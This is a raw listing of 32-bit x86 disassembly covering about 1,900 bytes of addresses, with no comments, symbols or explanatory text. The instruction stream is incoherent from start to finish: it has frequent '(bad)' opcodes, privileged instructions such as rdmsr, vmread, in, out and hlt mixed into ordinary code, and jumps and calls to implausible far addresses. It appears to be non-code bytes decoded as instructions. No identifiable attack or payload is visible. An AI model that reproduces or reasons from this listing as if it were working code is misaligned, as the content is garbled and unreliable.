  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
